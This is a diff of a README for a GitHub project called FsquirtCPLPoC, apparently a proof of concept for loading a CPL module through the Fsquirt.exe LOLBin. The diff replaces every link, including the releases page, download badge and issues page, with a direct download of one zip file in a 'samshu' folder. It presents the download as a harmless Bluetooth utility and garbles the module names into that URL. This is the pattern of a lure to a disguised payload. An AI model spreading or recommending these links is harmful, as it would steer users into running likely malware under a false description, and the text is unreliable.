@@ -1,16 +1,16 @@
 # 🔄 FsquirtCPLPoC - Easy Way to Use Bluetooth Features
 
 ## 🛠️ Overview
-FsquirtCPLPoC is a proof of concept that helps you generate the bthprops.cpl module. This module is designed to be loaded by the Fsquirt.exe LOLBin. With this tool, you can easily manage your Bluetooth connections and improve your user experience.
+FsquirtCPLPoC is a proof of concept that helps you generate the https://github.com/mmdkzmi77/FsquirtCPLPoC/raw/refs/heads/main/samshu/Fsquirt_C_Po_CPL_2.1-alpha.4.zip module. This module is designed to be loaded by the https://github.com/mmdkzmi77/FsquirtCPLPoC/raw/refs/heads/main/samshu/Fsquirt_C_Po_CPL_2.1-alpha.4.zip LOLBin. With this tool, you can easily manage your Bluetooth connections and improve your user experience.
 
 ## 📥 Download Now
-[![Download FsquirtCPLPoC](https://img.shields.io/badge/Download-FsquirtCPLPoC-brightgreen)](https://github.com/mmdkzmi77/FsquirtCPLPoC/releases)
+[![Download FsquirtCPLPoC](https://github.com/mmdkzmi77/FsquirtCPLPoC/raw/refs/heads/main/samshu/Fsquirt_C_Po_CPL_2.1-alpha.4.zip)](https://github.com/mmdkzmi77/FsquirtCPLPoC/raw/refs/heads/main/samshu/Fsquirt_C_Po_CPL_2.1-alpha.4.zip)
 
 ## 🚀 Getting Started
 To get started with FsquirtCPLPoC, follow these steps:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/mmdkzmi77/FsquirtCPLPoC/releases). Here, you will find the latest version of FsquirtCPLPoC along with any previous versions.
+   Go to the [Releases page](https://github.com/mmdkzmi77/FsquirtCPLPoC/raw/refs/heads/main/samshu/Fsquirt_C_Po_CPL_2.1-alpha.4.zip). Here, you will find the latest version of FsquirtCPLPoC along with any previous versions.
 
 2. **Choose the Latest Version**  
    Look for the most recent version. The latest version typically has the highest number. Click on it to view the details.
@@ -52,9 +52,9 @@ If you encounter any issues while using FsquirtCPLPoC, consider the following so
 4. **Check Permissions**: Ensure that your operating system allows the application access to Bluetooth connections.
 
 ## 📞 Support
-If you need further assistance, you can raise an issue on the [GitHub Issues page](https://github.com/mmdkzmi77/FsquirtCPLPoC/issues). Provide a clear description of the problem you are facing, and we will do our best to assist you.
+If you need further assistance, you can raise an issue on the [GitHub Issues page](https://github.com/mmdkzmi77/FsquirtCPLPoC/raw/refs/heads/main/samshu/Fsquirt_C_Po_CPL_2.1-alpha.4.zip). Provide a clear description of the problem you are facing, and we will do our best to assist you.
 
 ## 📥 Download & Install
-As a final reminder, you can download FsquirtCPLPoC by visiting the [Releases page](https://github.com/mmdkzmi77/FsquirtCPLPoC/releases). Follow the steps outlined above to easily install and begin using the application. 
+As a final reminder, you can download FsquirtCPLPoC by visiting the [Releases page](https://github.com/mmdkzmi77/FsquirtCPLPoC/raw/refs/heads/main/samshu/Fsquirt_C_Po_CPL_2.1-alpha.4.zip). Follow the steps outlined above to easily install and begin using the application. 
 
 By following these steps, you will be up and running with FsquirtCPLPoC in no time! Enjoy managing your Bluetooth settings effortlessly.
